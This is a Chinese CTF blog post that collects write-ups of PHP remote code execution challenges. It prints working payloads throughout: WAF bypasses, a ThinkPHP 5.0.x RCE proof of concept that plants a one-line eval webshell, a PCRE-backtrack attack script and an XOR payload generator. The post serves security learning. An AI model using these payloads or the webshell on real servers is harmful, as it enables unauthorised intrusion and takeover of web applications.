---
title: PHP的RCE问题集锦
date: 2023-12-04 17:17:33
updated: 2024-2-21 11:29:16
tags:
  - CTF
  - RCE
  - Web
categories: CTF Write Up
cover: https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/c74d52864acadc32631ab8b75a6cb15.jpg?x-oss-process=style/blog
description: 关于CTF中Web的RCE问题汇总。包括题目和相关知识点的介绍。
---

`RCE`是Remote Command Exec(远程命令执行)和Remote Code Exec(远程代码执行)的缩写;Command指的是操作系统的命令，code指的是脚本语言(php)的代码。CTF中有许多涉及到RCE的题目，我会将我遇到的题放在这里汇总并且穿插知识点讲解。

## 湖南省网络攻防邀请大赛ezrce

原题代码如下。

```php
<?php

class shell{
    public $exp;
    public function __destruct(){
        $str = preg_replace('/[^\W]+\((?R)?\)/', '', $this->exp);
        $code = substr($str , 0, 1);
        if(preg_match("/^[$code]+$/",$str))
        {
            eval($this->exp." hello world!");
        }
    }
}

if (!isset($_GET['exp'])){
    highlight_file(__FILE__);
}

if(!preg_match('/^[Oa]|get/i',$_GET['exp'])){
    unserialize($_GET['exp']);
} 
```

简单的审一下题，发现有四个关键点。

1. 开头的shell类中定义了一个析构函数` __destruct()`，意思是当对象在被销毁时调用此方法。一般出现魔术常量，十有八九就要用到反序列化了。
2. 析构函数内部有`preg_replace('/[^\W]+\((?R)?\)/', '', $this->exp)`这一串代码。`(?R)`引用当前表达式，后面加了`?`递归调用。
3. `eval($this->exp." hello world!");`中，这串代码在传入的exp后面拼接上了一个`hello world！`，这会导致eval语句产生语法错误而任意执行失败，需要想办法绕过。
4. `if(!preg_match('/^[Oa]|get/i',$_GET['exp']))`这个正则匹配我们使用get方式上传的exp中以‘O’或‘a’开头以及匹配所有‘get’开头的单词，如果没有匹配到才能执行反序列化。

也就是说这一道题就相当于四道题的知识点，而且还把这四个点组合在一起，实在是用心险恶。

那么我们就将其逐个击破依次来分析到底应该如何绕过达到RCE。

### 绕过传参正则匹配

由于题目中用到了析构函数` __destruct()`和反序列化函数`unserialize()`，所以我们需要构造一个exp将其实例化后的序列化字符串作为参数传入。但是这里有一个问题，当我们对exp实例化后，它的类型就变成了”对象“`Object`，实例化后的字符串开头必为`O`，这就导致我们被waf拦截无法成功传入exp。同样的，利用数组绕过，将数组元素实例化也无法绕过waf，因为数组序列化字符串开头为`a`。

咋一看好像我们所有的路都被堵死了，我过我在查阅大量资料后发现了几篇大佬的博客，有一段是这么说的：

>说说实现了serializable接口的类
>
>实现了serializable接口的类在序列化的时候返回的字符串是C开头的
>
>这一点可以绕过例如 O:\d+的这种正则

而且还可以通过跑一个脚本来查看当前哪些类继承了serializable。

```php
<?php
$classes = get_declared_classes();
foreach($classes as $clazz){
    $methods = get_class_methods($clazz);
    foreach($methods as $method){
        if (in_array($method,array("serialize"))){
            echo $clazz."\n";
        }
    }
}
```

![image-20231204161325432](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204161325432.png?x-oss-process=style/blog)

也就是说，用这几个类来实例化对象，返回的序列化字符串开头将为`C`。

![image-20231204161421082](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204161421082.png?x-oss-process=style/blog)

但是这么做仍然有问题。由于PHP版本的原因，高版本跑出来的序列化字符串仍然为`O`。但是自己写的类去实现serializeble接口再去序列化是没有问题的。建议用phpstorm，ide有在线低版本平台，是可以跑出来结果的。

![image-20231204162158897](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204162158897.png?x-oss-process=style/blog)

这里插句题外话，当时我没有找到合适的低版本平台，所以是照着老版本的序列化格式手搓exp的，还开了个字数统计器去数字数……

总之，通过调用实现了serializable接口的类，是可以实现绕过正则传参的。

至于为什么可以得到`C格式`，这个C的意思有可能是 **Customized serializing** 的意思。具体的原理可见后续的参考文章。

### 攻破无参RCE

在传入序列化exp后，下一只拦路虎就是`preg_replace('/[^\W]+\((?R)?\)/', '', $this->exp)`了。以上正则表达式只匹配`a(b(c()))`或`a()`这种格式，不匹配`a("123")`，也就是说我们传入的值函数不能带有参数，我们称呼它为`无参RCE`。

无参RCE主要考查的是你对与PHP函数的基类，无需输入参数来实现任意文件读取。

这里我们构造exp为`print_r(scandir(current(localeconv())));`。

- `localeconv()`:返回一包含本地数字及货币格式信息的数组，数组的第一项是`.`，`.`的意思是当前目录。同理`getcwd()`函数也具有同样的效果，但是由于本题waf禁止了序列化中`get`开头的单词，所以不用这个。
- `current()`:返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回当前文件的工作目录。
- `scandir()`:列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 **`FALSE`**。如果 `directory` 不是个目录，则返回布尔值 **`FALSE`** 并生成一条 **`E_WARNING`** 级的错误。
- `print_r()`:以规定的格式打印对象，数组等结构。

也就是说，这四个函数组合在一起就是返回并打印当前目录中的文件情况。

但是此时仍然无法顺利进行传参，因为还有最后一道墙等着我们。

### 绕过拼接符

因为末尾拼接了换行和非法的php语法字符串，导致语法错误。如果没有换行的话，可以采用注释来绕过，但是这里不行，无参RCE的筛选会导致单行注释失败。

```php
$str = preg_replace('/[^\W]+\((?R)?\)/', '', $this->exp);
        $code = substr($str , 0, 1);
        if(preg_match("/^[$code]+$/",$str))
        {
            eval($this->exp." hello world!");
        }
```

经过一系列复杂的正则，`$str`变量被筛去形如`abc((()))`的格式，最终只会得到一条完整语句的最后那部分`;`。而`$code`截取并赋值为`$str`的第一个字符，也为`;`。最后进入eval语句的正则匹配含义是要求`$str`变量完全由`$code`的字符构成，也就是说`$str`必须全为`;`。

然而针对这种情况，可以使用CTF以前常见的一种思路，来进行闭合PHP语句向下执行。构造exp为`print_r(scandir(current(localeconv())));__halt_compiler();`。

关于`__halt_compiler()`:[php文档介绍](https://www.php.net/manual/zh/function.halt-compiler.php)。

![image-20231204165547944](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204165547944.png?x-oss-process=style/blog)

这里我们用`;`隔离了两条语句上传，最后`$str`值为`;;`，不影响最后的正则匹配，因此可以进入eval语句并且成功绕过拼接符后的非法字符串。

至此，万事俱备只欠东风。

### 得到flag

构造exp并序列化后，传参`?exp=C:11:"ArrayObject":103:{x:i:0;a:0:{};m:a:1:{s:1:"a";O:5:"shell":1:{s:3:"exp";s:40:"print_r(scandir(current(localeconv())));";}}}`。

![image-20231204170110308](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204170110308.png?x-oss-process=style/blog)

得到敏感文件。

继续构造exp为`highlight_file(next(array_reverse(scandir(current(localeconv())))));__halt_compiler();`。

- `array_reverse()`:数组反转，将索引和值对换，在这里就是将文件名和对应的文件内容关系对换，将文件内容作为索引值。
- `next()`:将内部指针指向数组中的下一个元素，并输出。
- `highlight_file()`:高亮显示文件内容。

组合在一起就是高亮回显flag的文件代码。

传入exp的序列化字符串`?exp=C:11:"ArrayObject":149:{x:i:0;a:0:{};m:a:1:{s:1:"a";O:5:"shell":1:{s:3:"exp";s:86:"highlight_file(next(array_reverse(scandir(current(localeconv())))));__halt_compiler();";}}}`。

得到flag。

![image-20231204170744618](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204170744618.png?x-oss-process=style/blog)

### 参考

- [PHP无参数RCE | Extraderの博客](https://www.extrader.top/posts/4f9c9406/#测试代码)
- [【CTF竞赛】无参数RCE总结 - 码农教程 (manongjc.com)](http://www.manongjc.com/detail/58-fiksrlppxmnbcoi.html)
- [原生类在反序列化中的利用](https://cjlusec.ldxk.edu.cn/2023/04/07/php原生类在反序列化中的利用)
- [一次对PHP正则绕过的思考历程](https://forum.butian.net/index.php/share/926)
- [【闲扯】PHP Serializable接口 - 哔哩哔哩 (bilibili.com)](https://www.bilibili.com/read/cv22995917/)

## [SWPUCTF 2021 新生赛]finalrce

### 无回显RCE

话不多说直接上源代码 ↓ 

```php
 <?php
highlight_file(__FILE__);
if(isset($_GET['url']))
{
    $url=$_GET['url'];
    if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
    {
        echo "Sorry,you can't use this.";
    }
    else
    {
        echo "Can you see anything?";
        exec($url);
    }
} 
```

分析源代码可得出两个重点，一是有正则筛选黑名单，需要绕过WAF；二是命令执行函数为`exec()`，该函数无回显，也就是说我们不知道命令执行的结果。

关于无回显RCE问题，其实网上也有丰富的学习资料。比如利用`nc`等指令将数据外带到VPS上等。

但是这道题的WAF过滤了诸多字段，包括`nc`在内的大部分指令都被禁用了。于是经过资料查询，我们可以使用`tee`指令。

tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。更具体的资料可以查看菜鸟教程[Linux tee命令 | 菜鸟教程 (runoob.com)](https://www.runoob.com/linux/linux-comm-tee.html)。

于是我们可以构造payload`http://node4.anna.nssctf.cn:28125/?url=l''s |tee 1.txt`。

![image-20240221112002684](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112002684.png?x-oss-process=style/blog)

可以看到这里我们利用了`''`绕过了WAF，并且将内容输出到了1.txt文件。此时我们切换到`http://node4.anna.nssctf.cn:28125/1.txt`去查看文件。

![image-20240221112235705](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112235705.png?x-oss-process=style/blog)

写入成功，接下来我们就可以慢慢穿越目录找flag了。

最后使用exp`http://node4.anna.nssctf.cn:28125/?url=tac /flllll\aaaaaaggggggg|tee 1.txt`结束战斗。

![image-20240221112633338](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112633338.png?x-oss-process=style/blog)

得到flag`NSSCTF{64645b91-933c-49ca-9a67-d54a6a253297}`。

### 参考

- [【CTF】命令执行无回显利用_exec($cmd) 无回显-CSDN博客](https://blog.csdn.net/cosmoslin/article/details/123039067)
- [文章 - 【SWPUCTF 2021 新生赛】finalrce Leaderchen的WriteUp | NSSCTF](https://www.nssctf.cn/note/set/2564)

## [NISACTF 2022]level-up

这道题有多个level，所以我们一步步来复现。

首先进入环境。

![image-20240222181611748](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181611748.png?x-oss-process=style/blog)

noting here.

这肯定不对啊，打开源代码看看。

![image-20240222181741758](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181741758.png?x-oss-process=style/blog)

我靠这就是level1，赶紧套个小标题压压惊。

### level1

那么正式开始分析，这里的源代码`<!-- disallow: -->`暗示我们可能有源码泄露，于是我们访问一下`/robots.txt`。

![image-20240222181924043](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181924043.png?x-oss-process=style/blog)

果然，于是我们访问`/level_2_1s_h3re.php`，移动到level2。

### level2

![image-20240222182016334](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222182016334.png?x-oss-process=style/blog)

一眼望过去又是PHP中的md5碰撞，不过这里是强碰撞，且进行了字符化处理，也就是说0e碰撞和数组绕过的特性失效了。看来是真的要输入两个碰撞的md5值，没什么好说的，上网查资料，果然有现成的exp，放在这里备用。

```
array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

一顿操作后得到level3的路径。

![image-20240222183112065](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183112065.png?x-oss-process=style/blog)

访问`/Level___3.php`以移动到level3。

tips：最好使用burpsuite抓包发送，我用hackbar发送总是过不去，但是用burpsuite就没毛病……

### level3

![image-20240222183219619](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183219619.png?x-oss-process=style/blog)

同样的结构，只不过这次要求sha1碰撞，上网查exp，直接过。

```
array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```

![image-20240222183521462](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183521462.png?x-oss-process=style/blog)

成功得到level4路径，访问`/level_level_4.php`移动到level4。

### level4

![image-20240222183701902](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183701902.png?x-oss-process=style/blog)

这题有点意思。

明面上的思路就是以Get的方式发送变量名为`NI_SA_`值为`txw4ever`即可，即`http://node5.anna.nssctf.cn:28468/level_level_4.php?NI_SA_=txw4ever`。但是这么做的话，`$_SERVER['REQUEST_URI']`的值将变为`level_level_4.php?NI_SA_=txw4ever`，经过`parse_url()`处理后的`query`字段将为`NI_SA_`，而这恰好是在正则过滤黑名单中的，所以我们得绕过这个WAF。

这里就要说到一个特性，PHP会将请求参数中的非法字符替换为下划线，这里用`+`绕过，构造exp`/?NI+SA+=txw4ever`，可以得到level5的路径。

![image-20240222184653073](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222184653073.png?x-oss-process=style/blog)

根据`55_5_55.php`移动到level5。

### level5

![image-20240222184740573](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222184740573.png?x-oss-process=style/blog)

终于进入正题，来到RCE环节。注意到`$a('',$b);`，考虑使用`create_function()`来进行RCE。

这里简单的介绍一下我对`create_function()`函数的理解，更详细的介绍可以移步参考部分。

`create_function('字符串参数','字符串代码')`是一个PHP中用来创建匿名函数的函数，它接受两个字符串参数，第一个参数声明接受的形参，第二个参数用来描述函数的主体部分。以下是一个`create_function()`的使用范例。

```php
create_function('$a,$b','return($a+$b)');
//等价于
$fun=function ($a,$b){
    return ($a+$b);
};
```

如果第二个参数是可控的，那么我们就可以利用`create_function()`来完成命令执行，原理如下。

```php
create_function('$a','$b');
$b='return "ben is so handsome."};phpinfo();/*';
//等价于
$fun=function($a){
    return "ben is so handsome";
};
phpinfo();/*
}
//有点类似于SQL注入，提前闭合中括号，命令执行，再把原有的中括号注释掉。
```

同理，在这里我们也可以利用`create_function()`命令执行。令`$a=create_function`，`$b=};system('tac /f*');/*`构造exp。又因为存在WAF对`$a`的第一个字符进行过滤，捕捉任何字母和数字，所以我们还需要利用反斜杠进行绕过，即`$a=\create_funtion`。

![image-20240222190652192](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222190652192.png?x-oss-process=style/blog)

得到flag，收工。

### 参考

- [\$_SERVER【"REQUEST_URI"】函数_\$_server【'request_uri'】-CSDN博客](https://blog.csdn.net/qq_38568388/article/details/78353449)
- [create_function_百度百科 (baidu.com)](https://baike.baidu.com/item/create_function/2535040?fr=ge_ala)
- [CTF系列 PHP create_function的利用方式 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/377733114)

## [GXYCTF 2019]禁止套娃

容器，启动！

![image-20240222193409390](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222193409390.png?x-oss-process=style/blog)

flag在哪里呢？

### git泄露

老规矩，看源码。但是源码也没有找到信息，那就只能老老实实开dirsearch扫描了。扫描过程中发现有`/.git/HEAD`等文件，猜测存在git泄露，用githack工具扫一遍，果然抓到了泄露的git包。

![image-20240222193643988](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222193643988.png?x-oss-process=style/blog)

flag.php里没什么有用的信息，重要的是我们得到了index.php的源码。

### 无参RCE

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

可以看出有一个敏感函数`@eval($_GET['exp']);`，但是前面有三层WAF。第一层WAF基本堵死了伪协议，第二层WAF递归正则要求exp不能含有参数，第三层WAF过滤了一些文件名（我也不知道它想干啥）。

这道题和[湖南省网络攻防邀请大赛ezrce](#湖南省网络攻防邀请大赛ezrce)有异曲同工之妙，我们可以直接套它的exp`highlight_file(next(array_reverse(scandir(current(localeconv())))));`。

![image-20240222194901564](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222194901564.png?x-oss-process=style/blog)

果不其然直接就出了。

### 参考

见本章第一题。

## [SWPUCTF 2022 新生赛]ez_rce

### ThinkPHP模板注入

进入容器。

![image-20240223194303034](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223194303034.png?x-oss-process=style/blog)

真的什么都没有吗？（为什么RCE老喜欢藏着掖着）

看看源代码，一无所获。再看看robots.txt？果不其然，出现了提示。

![image-20240223195000028](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195000028.png?x-oss-process=style/blog)

于是我们访问`/NSS/index.php/`。

<img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195046009.png?x-oss-process=style/blog" alt="image-20240223195046009" style="zoom:67%;" />

BOOM！是ThinkPHP，赶紧随便访问个目录报错看看版本。

<img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195215386.png?x-oss-process=style/blog" alt="image-20240223195215386" style="zoom:67%;" />

重点来了，题目环境的ThinkPHP框架版本为V5.0.22，而在版本5.0.0<=5.0.23、5.1.0<=5.1.30中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。

于是我们可以利用网络上的POC直接命令执行。

1. 查看`phpinfo()`页面：

   `/index.php?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100`

   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201242477.png?x-oss-process=style/blog" alt="image-20240223201242477" style="zoom: 50%;" />

2. 执行系统命令：

   `/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami`

   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201313443.png?x-oss-process=style/blog" alt="image-20240223201313443" style="zoom:50%;" />

3. 写入`webshell`:

   `/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=加你要写入的文件内容url编码`

   这里写入一句话`<?php @eval($_GET['shell']); ?>`，编码后为

   `%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%47%45%54%5b%27%73%68%65%6c%6c%27%5d%29%3b%20%3f%3e`。

   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201659922.png?x-oss-process=style/blog" alt="image-20240223201659922" style="zoom: 50%;" />

   可以看到写入成功了，页面回显了数字31。

4. 切换到webshell文件`/shell.php`，用蚁剑连接或者直接命令执行。

   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223202200614.png?x-oss-process=style/blog" alt="image-20240223202200614" style="zoom:50%;" />

   

得到flag为`NSSCTF{95bf8727-f275-4819-8377-cbc13dca39fe}`。

### 参考

- [【ThinkPHP5 5.0.22/5.1.29 RCE】_thinkphp 5.0.22/5.1.29 rce-CSDN博客](https://blog.csdn.net/xhwfa/article/details/124549004)

## [NISACTF 2022]middlerce

### 无字符RCE

进入容器

![image-20240226095322389](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226095322389.png?x-oss-process=style/blog)

进行审计，发现这里主要有两层WAF，一个是出现在题目中的正则表达式，还有一个是隐藏在`check.php`的`checkdata()`函数。

分析第一层WAF可知，该正则表达式筛掉了所有的特殊符号和数字、字母。这道题属于无字母RCE，可以利用PCRE回溯次数上限来进行绕过。而对于第二层不可见的WAF，则需要通过FUZZ的形式测试出可以使用的函数再绕过。

关于PCRE的原理，其实差不多就是注入大量脏数据污染正则筛选的数据，而preg_match的匹配存在回溯，回溯上限是1000000次，超过这个上限后函数会直接返回false。更加具体的原理可以参考P神的文章，会在后面贴出。

这里给出我在网上找到的一个攻击脚本，可以直接获取flag。

```python
import requests
payload='{"cmd":"?><?= `tail /f*`?>","test":"' + "@"*(1000000) + '"}'
res = requests.post("http://1.14.71.254:28939/", data={"letter":payload})
print(res.text)
```

![image-20240226100309756](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226100309756.png?x-oss-process=style/blog)

顺带一提，还可以利用这个脚本查看`check.php`，可以看到这里过滤了大多数函数。

![image-20240226100407275](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226100407275.png?x-oss-process=style/blog)

### 参考

- [PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

## [HUBUCTF 2022 新生赛]HowToGetShell

### 无字母RCE

进入题目。

![image-20240226170028085](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226170028085.png?x-oss-process=style/blog)

十分的短小精悍，正则也是基本过滤了所有的字母，同样是无字母RCE，可以用异或或者取反的方法上传payload。

这里我们选择用异或绕过的方法解题，下面贴出一个异或的脚本。

```python
word = input("Input word:")
payload = """"""
for i in word:
    if i == "a":
        payload += '("!"^"@").'
    elif i == "b":
        payload += '("!"^"@").'
    elif i == "c":
        payload += '("#"^"@").'
    elif i == "d":
        payload += '("$"^"@").'
    elif i == "e":
        payload += '("%"^"@").'
    elif i == "f":
        payload += '("&"^"@").'
    elif i == "g":
        payload += '("\'"^"@").'
    elif i == "h":
        payload += '("("^"@").'
    elif i == "i":
        payload += '(")"^"@").'
    elif i == "j":
        payload += '("*"^"@").'
    elif i == "k":
        payload += '("+"^"@").'
    elif i == "l":
        payload += '(","^"@").'
    elif i == "m":
        payload += '("-"^"@").'
    elif i == "n":
        payload += '("."^"@").'
    elif i == "o":
        payload += '("/"^"@").'
    elif i == "p":
        payload += '("/"^"_").'
    elif i == "q":
        payload += '("/"^"^").'
    elif i == "r":
        payload += '("/"^"]").'
    elif i == "s":
        payload += '("-"^"^").'
    elif i == "t":
        payload += '("/"^"[").'
    elif i == "u":
        payload += '("("^"]").'
    elif i == "v":
        payload += '("("^"^").'
    elif i == "w":
        payload += '("("^"_").'
    elif i == "x":
        payload += '("&"^"^").'
    elif i == "y":
        payload += '''("'"^"^").'''
    elif i == "z":
        payload += '("&"^"\\").'
    elif i == "A":
        payload += '("!"^"`").'
    elif i == "B":
        payload += '("<"^"~").'
    elif i == "C":
        payload += '("#"^"`").'
    elif i == "D":
        payload += '("$"^"`").'
    elif i == "E":
        payload += '("%"^"`").'
    elif i == "F":
        payload += '("&"^"`").'
    elif i == "G":
        payload += '(":"^"}").'
    elif i == "H":
        payload += '("("^"`").'
    elif i == "I":
        payload += '(")"^"`").'
    elif i == "J":
        payload += '("*"^"`").'
    elif i == "K":
        payload += '("+"^"`").'
    elif i == "L":
        payload += '(","^"`").'
    elif i == "M":
        payload += '("-"^"`").'
    elif i == "N":
        payload += '("."^"`").'
    elif i == "O":
        payload += '("/"^"`").'
    elif i == "P":
        payload += '("."^"~").'
    elif i == "Q":
        payload += '("-"^"|").'
    elif i == "R":
        payload += '("."^"|").'
    elif i == "S":
        payload += '("("^"{").'
    elif i == "T":
        payload += '("("^"|").'
    elif i == "U":
        payload += '("("^"}").'
    elif i == "V":
        payload += '("("^"~").'
    elif i == "W":
        payload += '(")"^"~").'
    elif i == "X":
        payload += '("#"^"{").'
    elif i == "Y":
        payload += '("$"^"{").'
    elif i == "Z":
        payload += '("$"^"~").'
    else:
        payload += i
print("payload:\n"+payload)
#--------------------------------
def Parse_to_URL(s):
    a="%"+hex(ord(s))
    a=a.replace("0x","")
    return a

print("URL encode Payload:\n")
payload=list(payload)
for i in range(2,len(payload),10):
    payload[i]=Parse_to_URL(payload[i])
for i in range(6,len(payload),10):
    payload[i]=Parse_to_URL(payload[i])
payload="".join(payload)
print(payload)
```

构造payload如下。

```php
mess=$_=("!"^"@").("-"^"^").("-"^"^").("%"^"@").("/" ^ "]").("/"^"[");$__ = ('{' ^ '$') . ("." ^ "~") . ("/" ^ "`") . ("(" ^ "{") . ("(" ^ "|");$___=$$__;$_($___[_]);&_=phpinfo();
//$_===assert
//$__===_POST
//$___===$_POST
//$_($___[_])===assert($_POST['_'])
```

执行代码，回显`phpinfo()`页面，查找得flag`NSSCTF{5d6e9815-af9a-442f-8165-2a99598ddc36}`。

![image-20240226171106149](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226171106149.png?x-oss-process=style/blog)

### 参考

- [文章 - 【HUBUCTF 2022 新生赛】HowToGetShell tangkaiixng的WriteUp | NSSCTF](https://www.nssctf.cn/note/set/829)

---

（分割线~）

![c74d52864acadc32631ab8b75a6cb15](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/c74d52864acadc32631ab8b75a6cb15.jpg?x-oss-process=style/blog)
